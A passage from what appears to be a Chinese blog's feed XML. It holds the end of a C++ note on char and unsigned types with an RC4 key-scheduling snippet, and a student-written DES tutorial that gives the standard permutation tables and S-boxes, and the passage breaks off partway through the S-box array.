位），因此<code>char</code>数组可以用于存储较小的数据集，例如字符串、文本文件中的数据等。使用<code>char</code>数组可以有效地利用内存空间，特别是在处理大量文本数据时。</p><p>关于使用<code>unsigned</code>。在<code>C++</code>中，<code>unsigned</code>是一种整数类型修饰符，用于表示只能存储非负整数的数据类型。它可以将数据类型的取值范围限制为非负范围，即从<code>0</code>到<code>2^n-1</code>，其中 n 是该类型的位数。</p><p>以下是一些需要使用 unsigned 的情况：</p><ul><li>当需要表示的数据范围为非负时，例如计数器、循环索引等。</li><li>当需要与无符号整数类型进行算术运算时，例如位运算、移位运算等。</li><li>当需要确保变量不会存储负值时，例如在某些算法或数据结构中，负值没有意义或导致错误。</li><li>需要注意的是，如果使用 unsigned 修饰符，那么变量只能存储非负整数。如果尝试将负值存储到无符号整数类型中，编译器可能会发出警告或错误。因此，在使用 unsigned 时，需要确保程序中不会出现负值或确保在合适的地方进行了正确的处理。</li></ul><blockquote><p>在<code>C++</code>中，<code>char</code>类型通常被视为有符号类型，其取值范围为<code>-128</code>到<code>127</code>，无符号整数的取值范围为<code>0</code>到<code>255</code><br>比如说</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果不用unsigned 初始化char s数组的话，s[i] &gt; 127 就会有溢出错误！！！</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> <span class="comment">// KSA初始化S盒</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> s[<span class="number">256</span>]; <span class="comment">// S盒子</span></span><br><span class="line">  <span class="type">unsigned</span> key_len = secret_key.<span class="built_in">size</span>();</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> T[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">// 临时数组向量</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i ++ )</span><br><span class="line">  &#123;</span><br><span class="line">      s[i] = i;</span><br><span class="line">      T[i] = secret_key[i % key_len];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">C++数组在函数调用的时候需要注意的地方和指针的关系</summary>
    
    
    
    <category term="随记" scheme="https://nonevector.top/categories/%E9%9A%8F%E8%AE%B0/"/>
    
    
    <category term="C++" scheme="https://nonevector.top/tags/C/"/>
    
    <category term="指针" scheme="https://nonevector.top/tags/%E6%8C%87%E9%92%88/"/>
    
    <category term="数组" scheme="https://nonevector.top/tags/%E6%95%B0%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>密码学之DES算法</title>
    <link href="https://nonevector.top/posts/2.html"/>
    <id>https://nonevector.top/posts/2.html</id>
    <published>2023-10-14T07:52:58.853Z</published>
    <updated>2023-11-29T03:35:25.703Z</updated>
    
    <content type="html"><![CDATA[<p>《现代密码学基础》又在讲解经典<code>DES</code>算法了，我打算用 C++ 写了一个。本文介绍了 <code>DES</code> 算法加密的大致步骤和整体流程。</p><h2 id="一、DES-算法介绍">一、DES 算法介绍</h2><h3 id="1-介绍">1.介绍</h3><p>DES 算法为密码体制中的对称密码体制，⼜被称为美国数据加密标准。DES 是⼀个分组加密算法，典型的<code>DES</code>以<code>64</code>位为分组对数据加密，<code>加密和解密⽤的是同⼀个算法。</code></p><p>DES 使用 56 位的密钥和 64 位的明文块进行加密。DES 算法的分组大小是 64 位，因此，如果需要加密的明文长度不足 64 位，需要进行填充；如果明文长度超过 64 位，则需要使用分组模式进行分组加密。</p><h3 id="2-流程">2.流程</h3><p><img src="https://cdn.acwing.com/media/article/image/2023/10/20/169037_7a2887dc6e-1.png" alt="1.png"></p><ul><li><p>1.初始置换（IP 置换）：将输入的 64 位明文块进行置换和重新排列，生成新的 64 位数据块。</p></li><li><p>2.加密轮次：DES 加密算法共有 16 个轮次，每个轮次都包括四个步骤：</p><ul><li><p>2.1. 将 64 位数据块分为左右两个 32 位块。</p></li><li><p>2.2. 右侧 32 位块作为输入，经过扩展、异或、置换等操作生成一个 48 位的数据块。这个 48 位的数据块被称为“轮密钥”，它是根据加密算法的主密钥生成的子密钥。</p></li><li><p>2.3. 将左侧 32 位块和轮密钥进行异或运算，结果作为新的右侧 32 位块。</p></li><li><p>2.4. 将右侧 32 位块与原来的左侧 32 位块进行连接，生成一个新的 64 位数据块，作为下一轮的输入。</p></li></ul></li><li><p>3.末置换（FP 置换）：在最后一个轮次完成后，将经过加密的数据块进行置换和重新排列，得到加密后的 64 位密文。</p></li><li><p>4.逆置换：在经过 16 轮次计算后，DES 会对最后的结果进行最后一次置换。即为最后的输出结果</p></li></ul><p>总的来说，DES 加密的过程就是通过一系列置换、异或、扩展等运算，将明文分成<strong>若干个小块</strong>，然后根据主密钥生成一系列的轮密钥，利用轮密钥对每个小块进行加密，最终将加密结果<strong>重新组合成一个整体</strong>，得到密文。</p><h2 id="二、DES-算法详解">二、DES 算法详解</h2><blockquote><p>注意这里的 DES 用的许多函数都是固定的，公开的函数(因此并没有密码含义)，即已知条件，没有密码含义，下面会加粗提心！！！</p></blockquote><h3 id="1-初始置换-Initial-Permutation，IP-置换">1.初始置换(Initial Permutation，IP 置换)</h3><p>IP 置换是将输入的 64 位明文块进行置换和重新排列，生成新的 64 位数据块。</p><p>目的:增加加密的混乱程度，使明文中的每一位都能够对后面的加密过程产生影响，提高加密强度。</p><p>我们将把 64 位的顺序按下表中规定的顺序放置，图中的数字是在 64 位明文中每个比特的索引位置。<strong>注意，在 DES 中，这个置放规则是固定的</strong>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始置换</span></span><br><span class="line"><span class="type">int</span> IP[] = &#123; <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line">             <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">             <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>,</span><br><span class="line">             <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">             <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,  <span class="number">1</span>,</span><br><span class="line">             <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">             <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>,</span><br><span class="line">             <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span> &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>即将原来位于第 58 个位置的数据放在第 1 个位置，原来位于第 50 个位置的元素放在第 2 个位置，第 42 个放在第 3 个，34-&gt;4 以此类推…</p><p>初始置换的逆置换（Final Permutation，FP 置换）是将加密后的数据块进行置换和重新排列，得到最终的加密结果，与初始置换相对应。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 逆置换表</span></span><br><span class="line"><span class="type">int</span> IP_1[] = &#123;<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>,</span><br><span class="line">              <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">              <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>,</span><br><span class="line">              <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">              <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>,</span><br><span class="line">              <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">              <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line">              <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>,  <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>&#125;;</span><br></pre></td></tr></table></figure><h3 id="2-加密轮次">2.加密轮次</h3><p>初始置换完成后，明文被划分成了相同长度（32 位）的左右两部分，记作 L0,R0。接下来就会进行 16 个轮次的加密了。<br>我们从单独一个轮次来看。首先把目光聚焦在 R0 这里。<br><img src="https://cdn.acwing.com/media/article/image/2023/10/20/169037_844c3f1a6e-4-C.png" alt="4-C.png"></p><p>右半部分 R0 会作为下一轮次的左半部分 L1 的输入。以此类推，重复 16 轮运算。所以，上面描述的过程可以用以下公式表述。</p><blockquote><p>因为 R0 只有 32 位，R0 会补位到 48 位和本轮次生成的 48 位 K0(马上讲 K0 的生成)输入到 F 轮函数中去。F 函数的输出结果为 32 位，结果 F(R0,K0)会和 L0 进行异或运算作为下一轮次右半部分 R1 的输入。</p></blockquote><p>$$<br>R_i = F_i(R_{i-1}) ⊕ L_{i-1}<br>$$</p><p>$$<br>L_i = R_{i-1}<br>$$</p><h3 id="3-f-函数详细过程-R0">3.f 函数详细过程(R0)</h3><p><img src="https://cdn.acwing.com/media/article/image/2023/10/20/169037_870f17c26e-3.png" alt="3.png"></p><p>密码函数 f(R, K)接受两个输入：32 位的数据和 48 位的子密钥。然后：</p><ul><li><p>通过表 E 进行扩展置换，将输入的 32 位数据扩展为 48 位；</p></li><li><p>将扩展后的 48 位数据与 48 位的子密钥（ki)进行异或运算；</p></li><li><p>将异或得到的 48 位数据分成 8 个 6 位的块，每一个块通过对应的一个 S 表产生一个 4 位的输出。其中，每个 S 表都是 4 行 16 列。具体的置换过程如下：把 6 位输入中的第 1 位和第 6 位取出来行成一个两位的二进制数 x ，作为 Si 表中的行数（0~3）；把 6 位输入的中间 4 位构成另外一个二进制数 y，作为 Si 表的列数（0~15）；查出 Si 表中 x 行 y 列所对应的整数，将该整数转换为一个 4 位的二进制数。</p></li><li><p>把通过 S 表置换得到的 8 个 4 位连在一起，形成一个 32 位的数据。然后将该 32 位数据通过表 P 进行置换（称为 P-置换），置换后得到一个仍然是 32 位的结果数据，这就是 f(R, K)函数的输出。</p></li></ul><h4 id="3-1-拓展-R-到-48-位">3.1 拓展 R 到 48 位</h4><p>将 32 位的 R0 右半部分进行扩展，得到一个 48 位的数据块。同样的，数据拓展也是根据一个<strong>固定的置换表</strong>。红框中就是我们要补位的数据。<br><img src="https://cdn.acwing.com/media/article/image/2023/10/20/169037_029f9e7a6f-15.png" alt="15.png"><br>由此可见，扩展过程的每一位都是根据上述的置换表从输入的 32 位数据块中提取出来的。原始数据的第 32 位被补充到了新增列的第一个，第 5 位被补充到了第二个新增列的第一个，以此类推…</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 扩展置换表，将 32位 扩展至 48位</span></span><br><span class="line"><span class="type">int</span> E[] = &#123;<span class="number">32</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,</span><br><span class="line">    <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>,</span><br><span class="line">    <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>,</span><br><span class="line">   <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">   <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">   <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">   <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>,</span><br><span class="line">   <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>,  <span class="number">1</span>&#125;;</span><br></pre></td></tr></table></figure><h4 id="3-2-子密钥-K-的生成">3.2 子密钥 K 的生成</h4><p>DES 算法采用了每轮子密钥生成的方式来增加密钥的复杂性和安全性。每轮子密钥都是由主密钥（64 位）通过密钥调度算法（Key Schedule Algorithm）生成的。DES 算法的密钥调度算法可以将 64 位的主密钥分成 16 个子密钥，每个子密钥 48 位，用于每轮加密中与输入数据进行异或运算。<br>通过子密钥生成的流程图来看下整个过程。<br><img src="https://cdn.acwing.com/media/article/image/2023/10/20/169037_5922da0b6f-2.png" alt="2.png"></p><ul><li>1、将 64 位主密钥经过置换选择 1（Permuted Choice 1 简写为 PC-1）后输出了 56 位，将其分为左右两个 28 位的数据块，分别记为 C0 和 D0。同上面我们讲过的置换规则一样，PC-1 置换函数也是一个<strong>固定的置换表</strong>，即下图左上角<br><img src="https://cdn.acwing.com/media/article/image/2023/10/20/169037_2b077c766f-5.jpg" alt="5.jpg"><br>从 PC-1 的置换表中可以看到，舍弃掉的 8 位数据是原始数据中每 8 位数据的最后一位，也就是我们所熟知的奇偶检验位。这 8 位被丢弃是因为它们对于密钥的安全性没有贡献，而且能够使 DES 算法的计算速度更快。</li><li>2、对 C0 和 D0 进行循环左移操作。循环左移完成后生成 C1 和 D1。因此，在 16 个轮次的计算当中会得到 16 个 32 位的数据块 C1-C16 和 D1-D16。在 DES 中循环左移也有固定的规则。</li></ul><blockquote><p>对于 Ci 和 Di，若 i 为 1，2，9 或 16，则循环左移一位，否则循环左移两位。</p></blockquote><ul><li><p>3、 对于 C1，D1，将它们经过置换选择 2(Permuted Choice 2 简写位 PC-2）后，得到 48 位的子密钥 K1，用于每轮加密中与输入数据进行异或运算。PC-2 置换的输入是由 PC-1 置换生成的 56 位的密钥，而它的输出是 48 位的子密钥。PC-2 置换将 56 位的密钥重新排列，丢弃了 8 位并选取了其中的 48 位作为子密钥。PC-2 的置换规则如下：<br><img src="https://cdn.acwing.com/media/article/image/2023/10/20/169037_f2addb3a6f-5.png" alt="5.png"><br>即 PC-2 置换表的第一行表示选择了输入密钥中的第 14、17、11、24、1 和 5 位，并将它们作为输出子密钥的前 6 位。以此类推</p></li><li><p>4、至此，经过 PC-2 后的结果就是我们当前轮次的子密钥 K1 了。在整个 DES 加密过程中会生成 16 个 48 位子密钥 K1-K16，分别用于 DES 算法中的 16 轮加密过程，从而保证每轮加密所使用的密钥都是不同的，增加了破解的难度。</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 密钥置换表，将64位密钥变成56位</span></span><br><span class="line"><span class="type">int</span> PC_1[] = &#123;<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,</span><br><span class="line">   <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">  <span class="number">10</span>,  <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line">  <span class="number">19</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line">  <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,</span><br><span class="line">   <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">  <span class="number">14</span>,  <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line">  <span class="number">21</span>, <span class="number">13</span>,  <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>,  <span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩置换，将56位密钥压缩成48位子密钥</span></span><br><span class="line"><span class="type">int</span> PC_2[] = &#123;<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>,  <span class="number">1</span>,  <span class="number">5</span>,</span><br><span class="line">   <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>,  <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>,</span><br><span class="line">  <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>,  <span class="number">4</span>, <span class="number">26</span>,  <span class="number">8</span>,</span><br><span class="line">  <span class="number">16</span>,  <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>,  <span class="number">2</span>,</span><br><span class="line">  <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>,</span><br><span class="line">  <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>,</span><br><span class="line">  <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>,</span><br><span class="line">  <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 每轮左移的位数</span></span><br><span class="line"><span class="type">int</span> shiftBits[] = &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>&#125;;</span><br></pre></td></tr></table></figure><h4 id="3-3-当前轮次的子密钥与拓展的-48-位-R-进行异或运算">3.3 当前轮次的子密钥与拓展的 48 位 R 进行异或运算</h4><p>当前轮次的子密钥 Ki 与拓展的 48 位 Ri 进行异或运算。运算结果会作为接下来 S 盒替换的输入</p><h4 id="3-4-S-盒替换（Substitution-Box-substitution）">3.4 S 盒替换（Substitution Box substitution）</h4><blockquote><p>S 盒替换（Substitution Box substitution）是一种在密码学中广泛使用的加密技术。它是将明文中的一组比特映射到密文中的一组比特的过程，用于增强密码的安全性。DES 中 S 盒替换用于将上一轮异或运算的 48 位结果映射到 32 位输出中去。</p></blockquote><p>同样的，S 盒也是一种置换表。在 DES 的每一轮计算中 S 盒都是不一样的。这里我以第一轮计算中的 S 盒为例。从上图中我们看到，S 盒内部有 8 个 S 块，记作 S1-S8。每个 S 块都会接收 6 位字符作为输入并输出四位字符。这里我们以第一个 S 盒 S1 为例。他是一个 4*16 的置换表。<br><img src="https://cdn.acwing.com/media/article/image/2023/10/20/169037_b265ded06f-6.png" alt="6.png"><br>例如输入<code>101010</code>到<code>S1</code>中。<code>S1</code>会将这六位的第一位和第六位拿出来<code>10</code>作为<code>S1</code>的行，中间四位<code>0101</code>拿出来作为<code>S1</code>的列。我们转换成十进制，此时映射到这个 S 盒的位置就是<code>(2,5)</code>对应 S 盒的第<code>3</code>行第<code>6</code>列（索引都从<code>0</code>开始数）。<br>所以这个输入的结果是 6，将 6 转化为二进制 110，S 盒的输出是 4 位，所以得<code>S(101010)</code>=<code>0110</code></p><blockquote><p>因此，可以看到 S 盒其实是一种非线性的加密技术，它能够抵御许多传统的密码分析攻击，如差分攻击和线性攻击。</p></blockquote><h4 id="3-5-P-盒替换">3.5 P 盒替换</h4><p><img src="https://cdn.acwing.com/media/article/image/2023/10/20/169037_554de9766f-7.png" alt="7.png"><br>P 盒替换将 S 盒替换的 32 位输出作为输入，经过上述固定的替换表进行替换后即为最后 F 轮函数的结果。</p><p>该结果 F(R0,K0)与 L0 进行异或运算得到下一轮的右半部分 R1</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// S盒，每个S盒是4x16的置换表，6位 -&gt; 4位</span></span><br><span class="line"><span class="type">int</span> S_BOX[<span class="number">8</span>][<span class="number">4</span>][<span class="number">16</span>] = &#123;</span><br><span class="line">&#123;</span><br><span class="line">&#123;<span class="number">14</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">7</span>&#125;,</span><br><span class="line">&#123;<span class="number">0</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>&#125;,</span><br><span class="line">&#123;<span class="number">4</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">0</span>&#125;,</span><br><span class="line">&#123;<span class="number">15</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">13</span>&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">&#123;<span class="number">15</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">10</span>&#125;,</span><br><span class="line">&#123;<span class="number">3</span>,<span class="number">13</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">15</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">5</span>&#125;,</span><br><span class="line">&#123;<span class="number">0</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">15</span>&#125;,</span><br><span class="line">&#123;<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">9</span>&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">&#123;<span class="number">10</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">8</span>&#125;,</span><br><span class="line">&#123;<span class="number">13</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">1</span>&#125;,</span><br><span class="line">&#123;<span class="number">13</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">7</span>&#125;,</span><br><span class="line">&#123;<span class="number">1</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">12</span>&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">&#123;<span class="number">7</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">4</span>,<span 